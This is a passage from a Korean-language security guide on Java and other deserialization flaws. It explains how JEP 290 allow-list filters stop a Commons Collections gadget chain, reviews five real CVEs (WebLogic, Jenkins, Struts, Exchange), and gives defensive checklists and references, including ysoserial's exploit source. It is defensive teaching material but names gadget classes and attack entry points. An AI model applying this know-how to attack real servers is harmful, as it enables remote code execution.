`ObjectInputStream`은 클래스 서술자(class descriptor)를 읽을 때마다 필터를 호출한다. JDK 소스에서 `readNonProxyDesc()`는 `resolveClass()`로 클래스를 찾은 **직후, 다른 무엇도 읽기 전에** `filterCheck(cl, -1)`를 부른다. 거부되면 `InvalidClassException: filter status: REJECTED`로 스트림 전체가 중단된다. 그 시점에 일어난 일은 클래스 로딩뿐이다. 인스턴스가 만들어지지 않았고, 필드도 읽지 않았고, `readObject()`도 `hashCode()`도 호출되지 않았다.

7.1의 체인을 허용 목록 `java.util.*;java.lang.*;!*`에 통과시키면 다음과 같이 된다.

```
HashSet                → java.util   허용
  (요소 읽기) TiedMapEntry → org.apache.commons.collections.keyvalue   ✗ REJECTED
    LazyMap, ChainedTransformer, Transformer[], InvokerTransformer … 는 읽히지도 않는다
```

필터는 스트림의 **첫 비허용 클래스 이름**에서 체인을 끊는다. 그래서 두 가지가 따라온다. 첫째, 허용 목록(`!*`로 끝나는)만이 "모르는 체인"까지 막는다. 차단 목록은 7.2에서 찾은 다음 고리가 나오면 끝이다. 둘째, 필터가 막지 못하는 것도 분명하다. 허용한 패키지 안에서만 이어지는 체인(`URLDNS`처럼 JDK 클래스만 쓰는 체인은 `java.*`를 허용하면 통과한다), 그리고 역직렬화가 아닌 경로(Jackson 다형 타입, XStream)는 이 필터의 영역이 아니다. `maxdepth`·`maxarray`·`maxrefs`·`maxbytes` 제한은 DoS용이지 RCE 체인을 막는 장치가 아니다.

적용 범위도 확인한다. `ObjectInputStream.setObjectInputFilter()`는 그 스트림 하나에, `-Djdk.serialFilter=`는 JVM 전역에 걸린다. 전역 필터를 켜 두고 코드에서 스트림별 필터로 덮어쓰면 **덮어쓴 쪽이 이긴다**. JDK 17의 JEP 415는 `jdk.serialFilterFactory`로 "스트림별 필터와 전역 필터를 합치는" 팩토리를 둘 수 있게 했다. 다만 기본 팩토리는 여전히 새 필터로 **교체**하므로(JDK 17·21의 `ObjectInputFilter.Config.BuiltinFilterFactory.apply`는 `newFilter`를 그대로 반환), 합치려면 `ObjectInputFilter.merge`를 쓰는 팩토리를 직접 등록해야 한다. 점검 보고서에는 "필터가 있다"가 아니라 "어느 스트림에 어떤 패턴이 걸려 있고, `!*`로 끝나는가"를 적는다.

## 8. 실제 CVE 사례

| CVE | 제품 | 핵심 | 패치 |
|---|---|---|---|
| [CVE-2015-4852](https://nvd.nist.gov/vuln/detail/CVE-2015-4852) | Oracle WebLogic Server | T3 프로토콜(7001/tcp)로 보낸 직렬화 객체를 역직렬화. 번들된 Commons Collections 가젯. 인증 불필요 | [Oracle 권고](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html) |
| [CVE-2015-8103](https://nvd.nist.gov/vuln/detail/CVE-2015-8103) | Jenkins (1.638 / LTS 1.625.2 미만) | CLI 포트가 원격에서 직렬화 객체를 받음. Commons Collections·Groovy 가젯 | [Jenkins 권고 SECURITY-218](https://www.jenkins.io/security/advisory/2015-11-11/) |
| [CVE-2017-9805](https://nvd.nist.gov/vuln/detail/CVE-2017-9805) | Apache Struts 2 REST 플러그인 | XStream이 XML 요청을 타입 제한 없이 역직렬화. 인증 불필요 RCE | [S2-052](https://cwiki.apache.org/confluence/display/WW/S2-052) |
| [CVE-2019-2725](https://nvd.nist.gov/vuln/detail/CVE-2019-2725) | Oracle WebLogic Server | `wls9_async_response.war`·`wls-wsat.war`가 SOAP 본문의 XML 인코딩 Java 객체를 역직렬화. 공개 며칠 만에 크립토마이너 배포에 악용 | [Oracle 권고](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html) |
| [CVE-2020-0688](https://nvd.nist.gov/vuln/detail/CVE-2020-0688) | Microsoft Exchange Server (ECP) | 모든 설치본이 같은 `validationKey`·`decryptionKey`를 사용. ViewState 서명을 위조해 .NET 역직렬화 RCE (SYSTEM 권한) | [MS 권고](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0688) |

**WebLogic (CVE-2015-4852) 에서 배울 것**: 권고문·공개 분석 기준으로, Oracle은 T3 역직렬화 경로에 클래스 차단 목록을 넣는 방식으로 대응했다. 이후 CVE-2017-3248, CVE-2018-2628, CVE-2019-2725 등 WebLogic 역직렬화 CVE가 매년 이어졌다. 차단 목록의 한계를 보여 주는 가장 긴 사례다. 한편 Apache는 같은 달 Commons Collections 3.2.2를 내며 `InvokerTransformer` 등 함수자(functor) 클래스의 직렬화를 기본 비활성화했다(복원하려면 `org.apache.commons.collections.enableUnsafeSerialization=true`). 가젯 쪽에서 막는 것과 싱크 쪽에서 막는 것, 둘 다 필요하다는 뜻이다.

**Jenkins (CVE-2015-8103) 에서 배울 것**: 권고문 기준으로, CLI 역직렬화 경로에 클래스 필터를 적용했다. 그러나 근본 해법은 "원격에서 Java 직렬화를 받는 CLI 프로토콜" 자체를 없애는 것이었고, Jenkins는 이후 수년에 걸쳐 그 방향으로 갔다. 2017년 Oracle이 JEP 290을 8u121·7u131·6u141까지 백포트한 것도 이 시기의 사건들이 배경이다.

**Struts (CVE-2017-9805) 에서 배울 것**: 권고문 기준으로, 패치는 XStream에 타입 허용 목록을 적용했다. "XML이니까 역직렬화가 아니다"가 틀렸음을 보여 준다. 포맷이 아니라 **입력이 클래스를 고를 수 있는가**가 기준이다. 같은 해 Struts의 OGNL 인젝션 [CVE-2017-5638](../part7-walkthroughs/03-cve-2017-5638-struts.md)과 함께, "프레임워크가 입력을 코드로 해석하는" 두 가지 경로를 비교해 읽으면 좋다.

**Exchange (CVE-2020-0688) 에서 배울 것**: 패치는 설치 시 키를 무작위로 생성하게 바꿨다. 역직렬화 싱크(ViewState)는 그대로 두고 서명 키만 고친 것이다. 서명은 "키가 비밀일 때만" 방어다. 6절에서 서명을 포맷 교체 아래에 둔 이유다.

## 9. 체크리스트

**코드 리뷰할 때**
- [ ] 3.1절의 싱크 함수 호출이 있는가? 각각의 입력 출처를 추적했는가?
- [ ] JSON·XML 라이브러리에 다형 타입 설정(`enableDefaultTyping`, `TypeNameHandling`, XStream 무제한)이 켜져 있는가?
- [ ] 네이티브 직렬화가 불가피하다면 허용 목록 필터가 `!*`로 끝나는가?
- [ ] PHP라면 파일 함수에 사용자 제어 경로가 들어가는가? (`phar://`)
- [ ] 클래스패스에 알려진 가젯 라이브러리가 있는가? 버전은?

**테스트할 때**
- [ ] 쿠키·히든 필드·본문에서 3.2절의 지문을 찾았는가?
- [ ] 값만 바꿔서 동작이 변하는가?
- [ ] `URLDNS` 같은 무해 가젯으로 역직렬화 발생을 확인했는가?
- [ ] RMI·JMX·T3·메시지 큐 같은 비(非)HTTP 진입점도 봤는가?

**배포 전**
- [ ] `-Djdk.serialFilter`가 JVM 전역에 설정되어 있는가?
- [ ] 서명 키가 설치본마다 다르고 소스 코드에 없는가?
- [ ] SCA 도구가 가젯 라이브러리의 취약 버전을 잡는가?

## 10. 더 읽기

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [JEP 290: Filter Incoming Serialization Data](https://openjdk.org/jeps/290) · 필터 문법의 원 문서
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) · 언어별 안전한 설정
- [Microsoft, BinaryFormatter security guide](https://learn.microsoft.com/dotnet/standard/serialization/binaryformatter-security-guide) · "안전하게 만들 수 없다"는 공식 입장과 .NET 9 제거 경위
- [Python `pickle` 문서](https://docs.python.org/3/library/pickle.html) · 첫 단락의 경고와 `find_class` 제한 예제
- Chris Frohoff, Gabriel Lawrence, "Marshalling Pickles" (AppSec California, 2015) · [슬라이드](https://frohoff.github.io/appseccali-marshalling-pickles/) · 가젯 체인 개념의 출발점
- Sam Thomas, "It's a PHP Unserialization Vulnerability Jim, but Not as We Know It" (Black Hat USA, 2018) · `phar://` 역직렬화
- [Apache Commons statement on Java deserialisation (2015)](https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread) · 3.2.2 변경과 "유일한 가젯이 아니다"
- [ysoserial `CommonsCollections6.java`](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java) · 7.1절이 따라간 체인의 원 소스. 주석의 호출 순서와 `@Dependencies`·`JavaVersion` 조건
- [JEP 415: Context-Specific Deserialization Filters](https://openjdk.org/jeps/415) · 스트림별 필터와 전역 필터의 결합 (JDK 17)
- Ian Haken, [gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector) (Black Hat USA, 2018) · 바이트코드에서 가젯 체인 자동 탐색
- [PortSwigger Web Security Academy: Insecure deserialization](https://portswigger.net/web-security/deserialization) · 4.2절 랩

## 변경 이력

| 날짜 | 변경 | 기여자 |
|---|---|---|
| 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
| 2026-10-22 | 10섹션 전체 작성. 언어별 패턴 4종, CVE 5건, pickle 재현 코드, PortSwigger 랩 목록 추가 | @anthonynoh5202 |
| 2026-10-22 | 기술 검증: CVE 11건 레코드 대조(전부 실존). pickle 재현 코드 실행 확인 후 지문·json.loads 예외 종류 설명 보정. ObjectInputFilter 문법 Java로 실행 확인 | 검증팀 |
| 2026-10-23 | 기술 검증(2차, 7절): ysoserial CommonsCollections6·CommonsCollections1·JavaVersion 소스와 Commons Collections 3.1 태그의 TiedMapEntry·LazyMap·ChainedTransformer·InvokerTransformer 소스로 인용 코드·호출 순서·`update <= 71` 조건 대조(일치). 3.2.2(2015-11-12)·4.1(2015-11-25) 릴리스일, `enableUnsafeSerialization` 속성명, 4.0 TransformingComparator의 Serializable 여부를 소스로 확인. ChainSteps를 JDK 21+CC 3.1로 재실행(5·6·7단계 표식 생성). JEP 290 `filterCheck` 시점을 JDK 17 ObjectInputStream 소스로 확인. JEP 415 서술을 기본 팩토리가 교체 동작임을 명시하도록 보정, CC6 호출 순서가 주석을 풀어 쓴 것임을 명시 | 검증팀 |
| 2026-10-22 | 독자 테스트 반영: 7절을 🔴로 확장. Commons Collections 3.1 체인(CC6) 고리별 해부·ysoserial 소스 인용·단계별 자바 호출 실습, 가젯 체인 탐색법과 버전별 차이, JEP 290 차단 지점. 장 참조 표기 정리 | @anthonynoh5202 |
| 2026-10-23 | 독자 테스트 2차 반영: `phar://` 자동 역직렬화를 PHP 8.0 미만 조건으로 한정(8.3에서 실행 확인). PyYAML 범위를 5.4 미만(FullLoader 포함, CVE-2020-1747·CVE-2020-14343)·6.0부터 Loader 필수로 정정(6.0에서 실행 확인). ChainSteps의 `lazy2`·`lazy3` 정의와 LazyMap 캐시 설명 추가(CC 3.1로 재실행 확인) | @anthonynoh5202 |
